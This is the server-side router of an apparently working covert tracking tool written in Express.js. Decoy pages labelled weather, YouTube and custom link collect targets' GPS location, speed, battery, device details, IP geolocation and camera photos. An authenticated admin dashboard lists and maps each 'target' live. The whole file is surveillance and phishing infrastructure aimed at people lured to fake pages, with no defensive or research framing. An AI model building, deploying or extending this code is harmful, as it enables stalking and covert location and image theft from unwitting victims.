const express = require("express")
const router = express.Router()
const config = require("./config")

const TARGETS = new Map()

function sanitizeTargetId(id) {
    if (typeof id !== 'string') return null;
    const clean = id.trim();
    if (['__proto__', 'constructor', 'prototype'].includes(clean.toLowerCase())) {
        return null;
    }
    if (/^[a-zA-Z0-9_-]{4,64}$/.test(clean)) {
        return clean;
    }
    return null;
}

function extractClientIp(req) {
    const cfIp = req.headers['cf-connecting-ip'];
    if (cfIp) return cfIp;
    const xForwardedFor = req.headers['x-forwarded-for'];
    if (xForwardedFor) return xForwardedFor.split(',')[0].trim();
    return req.ip || (req.socket ? req.socket.remoteAddress : '') || '';
}

async function getIpInfo(ip) {
    if (!ip || ip.includes('127.0.0.1') || ip.includes('::1') || ip === '::ffff:127.0.0.1') {
        return {
            ip: ip || '127.0.0.1',
            city: 'Local Network',
            region: 'Development',
            country: 'Localhost',
            isp: 'Internal Loopback'
        };
    }

    try {
        const res = await fetch(`http://ip-api.com/json/${ip}?fields=status,country,regionName,city,lat,lon,isp,query`);
        if (res.ok) {
            const data = await res.json();
            if (data.status === 'success') {
                return {
                    ip: data.query,
                    city: data.city,
                    region: data.regionName,
                    country: data.country,
                    lat: data.lat,
                    lng: data.lon,
                    isp: data.isp
                };
            }
        }
    } catch (e) {}

    try {
        const res2 = await fetch(`https://ipapi.co/${ip}/json/`);
        if (res2.ok) {
            const data2 = await res2.json();
            return {
                ip: data2.ip || ip,
                city: data2.city || 'Cellular Location',
                region: data2.region || '',
                country: data2.country_name || '',
                lat: data2.latitude,
                lng: data2.longitude,
                isp: data2.org || data2.asn || 'Cellular Network'
            };
        }
    } catch (e) {}

    return {
        ip: ip,
        city: 'Cellular Location',
        region: '',
        country: '',
        isp: 'Mobile ISP Network'
    };
}

function updateTargetTelemetry(rawId, payload) {
    const id = sanitizeTargetId(rawId);
    if (!id) return null;

    let target = TARGETS.get(id);

    if (!target) {
        target = {
            id: id,
            lat: (typeof payload.lat === 'number' && !isNaN(payload.lat)) ? payload.lat : 0,
            lng: (typeof payload.lng === 'number' && !isNaN(payload.lng)) ? payload.lng : 0,
            accuracy: (typeof payload.accuracy === 'number' && !isNaN(payload.accuracy)) ? payload.accuracy : 0,
            speed: (typeof payload.speed === 'number' && !isNaN(payload.speed)) ? payload.speed : 0,
            heading: (typeof payload.heading === 'number' && !isNaN(payload.heading)) ? payload.heading : 0,
            battery: payload.battery || null,
            device: payload.device || null,
            ipLocation: payload.ipLocation || null,
            photos: [],
            lastSeen: Date.now(),
            template: payload.template || 'weather'
        };
        TARGETS.set(id, target);
        if (global.IO) {
            global.IO.emit("user-connected", id);
        }
    } else {
        if (typeof payload.lat === 'number' && !isNaN(payload.lat)) target.lat = payload.lat;
        if (typeof payload.lng === 'number' && !isNaN(payload.lng)) target.lng = payload.lng;
        if (typeof payload.accuracy === 'number' && !isNaN(payload.accuracy)) target.accuracy = payload.accuracy;
        if (typeof payload.speed === 'number' && !isNaN(payload.speed)) target.speed = payload.speed;
        if (typeof payload.heading === 'number' && !isNaN(payload.heading)) target.heading = payload.heading;
        if (payload.battery) target.battery = payload.battery;
        if (payload.device) target.device = payload.device;
        if (payload.ipLocation) target.ipLocation = payload.ipLocation;
        if (payload.template) target.template = payload.template;
        target.lastSeen = Date.now();
    }

    if (payload.photo && typeof payload.photo === 'string' && payload.photo.startsWith('data:image/')) {
        if (!target.photos) target.photos = [];
        if (target.photos.length === 0 || target.photos[0].data !== payload.photo) {
            target.photos.unshift({
                id: Date.now().toString(36) + Math.random().toString(36).substr(2, 5),
                data: payload.photo,
                timestamp: Date.now()
            });
            // Keep maximum 10 photos per target to stay well within memory & Vercel limits
            if (target.photos.length > 10) {
                target.photos.pop();
            }
        }
    }

    if (global.IO) {
        global.IO.emit("map-data", { id: id, target: target, lat: target.lat, lng: target.lng });
    }

    return target;
}

// Login route
router.route("/login")
    .get((req, res) => {
        res.render("login");
    })
    .post((req, res) => {
        const { username, password } = req.body;

        if (config.username === username && config.password === password) {
            res.cookie("token", config.token, { httpOnly: true, maxAge: 86400000 });
            return res.redirect("/");
        } else {
            return res.redirect("/login?error=invalid");
        }
    });

router.get("/logout", (req, res) => {
    res.clearCookie("token").redirect("/login");
});

// Decoy & Telemetry ingestion routes
router.route("/weather").get((req, res) => {
    res.render("weather");
}).post(async (req, res) => {
    const clientIp = extractClientIp(req);
    if (!req.body.ipLocation) {
        req.body.ipLocation = await getIpInfo(clientIp);
    }
    updateTargetTelemetry(req.body.id, req.body);
    res.send("OK");
});

router.route("/youtube").get((req, res) => {
    res.render("youtube");
});

router.route("/custom").get((req, res) => {
    res.render("custom");
});

router.route("/link").get((req, res) => {
    res.render("link");
});

router.route("/api/telemetry").post(async (req, res) => {
    const clientIp = extractClientIp(req);
    if (!req.body.ipLocation || !req.body.ipLocation.ip) {
        req.body.ipLocation = await getIpInfo(clientIp);
    }
    const target = updateTargetTelemetry(req.body.id, req.body);
    if (!target) {
        return res.status(400).json({ status: "ERROR", message: "Invalid payload or Target ID" });
    }
    res.json({ status: "OK", id: target.id });
});

// Token verification middleware for Admin routes & APIs
router.use(function checkToken(req, res, next) {
    const token = req.cookies.token;

    if (token != null && token === config.token) {
        next();
    } else {
        res.clearCookie("token").redirect("/login");
    }
});

// Target Management APIs
router.get("/api/targets", (req, res) => {
    const summary = {};
    for (const [id, target] of TARGETS.entries()) {
        // Omit heavy photo base64 data string in targets list overview to reduce network payload
        summary[id] = {
            id: target.id,
            lat: target.lat,
            lng: target.lng,
            accuracy: target.accuracy,
            speed: target.speed,
            heading: target.heading,
            battery: target.battery,
            device: target.device,
            ipLocation: target.ipLocation,
            photosCount: target.photos ? target.photos.length : 0,
            photos: (target.photos || []).map(p => ({ id: p.id, timestamp: p.timestamp })),
            lastSeen: target.lastSeen,
            template: target.template
        };
    }
    res.json(summary);
});

router.get("/api/targets/:id", (req, res) => {
    const cleanId = sanitizeTargetId(req.params.id);
    if (!cleanId) return res.status(404).json(null);
    res.json(TARGETS.get(cleanId) || null);
});

router.delete("/api/targets/:id", (req, res) => {
    const cleanId = sanitizeTargetId(req.params.id);
    if (cleanId && TARGETS.has(cleanId)) {
        TARGETS.delete(cleanId);
        if (global.IO) global.IO.emit("user-disconnected", cleanId);
    }
    res.json({ success: true });
});

router.route("/").get((req, res) => {
    res.render("home");
});

router.route("/map").get((req, res) => {
    const cleanId = sanitizeTargetId(req.query.id);
    const target = cleanId ? TARGETS.get(cleanId) : null;
    res.render("map", {
        data: JSON.stringify(target && typeof target.lat === 'number' ? [target.lat, target.lng] : [0, 0])
    });
});

module.exports = router;